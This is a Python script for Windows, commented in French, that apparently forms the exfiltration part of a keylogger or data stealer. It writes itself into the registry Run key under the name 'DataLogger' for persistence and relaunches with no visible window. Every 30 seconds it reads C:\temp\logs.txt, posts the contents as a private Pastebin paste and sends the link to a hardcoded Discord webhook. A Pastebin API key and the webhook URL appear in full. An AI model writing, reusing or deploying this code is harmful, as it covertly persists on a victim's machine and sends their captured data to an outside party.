import requests
import os
import subprocess
import time
import winreg

# Chemin du fichier logs.txt
file_path = "C:\\temp\\logs.txt"

# Clé API Pastebin et URL Webhook Discord
PPASTE_URL = "https://pastebin.com/api/api_post.php"
PASTEBIN_API_KEY = "kBPwO6hTPYD_orYQKI5b6jJMrpbi7AG_"
webhook_url = "https://discordapp.com/api/webhooks/1316843560754090096/_SuQvBz1yZhYehJCuMikTsFw6L6mqsC1ltbau1jTmxV50ZlAdgyfZVq4s5HRmpMQCBWG"

# Fonction pour ajouter le script au démarrage
def add_to_startup():
    script_path = os.path.abspath(__file__)
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DataLogger", 0, winreg.REG_SZ, f"pythonx.exe \"{script_path}\"")
        winreg.CloseKey(key)
    except Exception as e:
        print(f"Erreur lors de l'ajout au démarrage : {e}")

# Fonction pour exécuter le script en mode masqué
def run_hidden():
    if not os.environ.get("IS_RUNNING_HIDDEN"):
        os.environ["IS_RUNNING_HIDDEN"] = "1"
        subprocess.Popen(["pythonx.exe", os.path.abspath(__file__)], creationflags=subprocess.CREATE_NO_WINDOW)
        exit()

# Fonction pour télécharger les logs vers Pastebin
def upload_to_pastebin(content):
    data = {
        "api_dev_key": PASTEBIN_API_KEY,
        "api_option": "paste",
        "api_paste_code": content,
        "api_paste_private": 1,  # Privé
        "api_paste_format": "text"
    }
    response = requests.post(PPASTE_URL, data=data)
    if response.status_code == 200 and "pastebin.com" in response.text:
        return response.text
    else:
        print(f"Erreur lors de l'envoi à Pastebin: {response.status_code}, {response.text}")
        return None

# Fonction pour envoyer un message au webhook Discord
def send_to_discord(message):
    data = {"content": message}
    response = requests.post(webhook_url, json=data)
    if response.status_code != 204:
        print(f"Erreur lors de l'envoi au webhook Discord: {response.status_code}, {response.text}")

# Fonction principale : envoi périodique des logs
def send_logs_periodically():
    while True:
        time.sleep(30)  # Toutes les 2 heures
        if os.path.exists(file_path):
            with open(file_path, "r", encoding="utf-8") as file:
                logs_content = file.read()
            pastebin_url = upload_to_pastebin(logs_content)
            if pastebin_url:
                send_to_discord(f"Voici le lien vers les logs : {pastebin_url}")
            else:
                print("Impossible de télécharger les logs sur Pastebin.")
        else:
            print(f"Le fichier {file_path} est introuvable.")

# Lancer le script
if __name__ == "__main__":
    if not os.environ.get("IS_RUNNING_HIDDEN"):
        add_to_startup()
        run_hidden()

    send_logs_periodically()
